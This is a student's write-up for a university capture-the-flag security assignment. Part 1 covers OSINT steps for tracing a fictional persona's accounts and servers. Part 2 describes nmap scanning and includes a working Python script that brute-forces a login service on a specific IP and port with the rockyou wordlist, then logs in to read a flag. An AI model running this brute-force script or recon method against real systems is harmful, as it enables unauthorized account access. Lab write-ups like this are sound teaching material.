Writeup 2 - OSINT (Open Source Intelligence)
======

Name: Michael Zheng
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: Michael Zheng

## Assignment 2 writeup

### Part 1 (45 pts)

1. Fred Krueger

2. First, I search up kruegster1990 on google. I saw that he had a reddit account https://www.reddit.com/user/kruegster1990. Then I try using twitter and found his twitter account https://twitter.com/kruegster1990. I found his instagram account https://www.instagram.com/kruegster1990

3. His Twitter account tells me where he works. I copy the link and then paste it on the centralops and found the ip address: 142.93.118.186.

4. I use robot.txt which shows a hidden directory http://www.cornerstoneairlines.co/secret/ and got CMSC389R-{fly_th3_skles_wlth_u5}

5. When I click on the admin tab, I found 142.93.117.193.

6. Using the censys.io, I found 142.93.117.193 and 142.93.118.186 are both located at New York City. 

7. From the censys.io, the 0S is Ubuntu.

8. CMSC389R-{h1dden_fl4g_in_s0urce}

### Part 2 (55 pts)

From the nmaps on the CornerStone website, I found the ip address is 142.93.117.193. From the nmaps, I found the port number 22 was open, so I put it down on my program. Afterward, based from his email and the hint from piazza, I guess his username could be kruegster. I use kruegster as the username in the stub.py and tried to find the correct password by iterating through rockyou.txt. However, my program stated that the connection failed. I tried using nmap again and use port 1337. I tried running my code again. It prints out the password "pokemon". Then I entered nc 142.93.117.93 1337. Then I type enter kruegster and pokemon which let me to login. I enter cd home and cd flight_records. In this directory, it list all the flights. From his instagram, there is a picture showing his flight number AAC27670. I enter cat AAC27670.txt where I get the flag CMSC389R-{c0rn3rstone-air-27670}. 

Below is the code which can be found in stub.py 
"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            the Briong server.
    """
    username = "kruegster"   # Hint: use OSINT
    password = ""            # Hint: use wordlist

    read =  open(wordlist, 'r')
    for line in read:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
        data = s.recv(1024)
        if data:
            s.send(username + "\n")
            data = s.recv(1024)
            if data:
                s.send(line + "\n")
                data = s.recv(1024)
                if data != b'Fail\n':
                    print("Username: " + username + " data: " + data +" pass: " + line)
                    return
            else:

                print("username wrong" + '\n')









if __name__ == '__main__':
    brute_force()

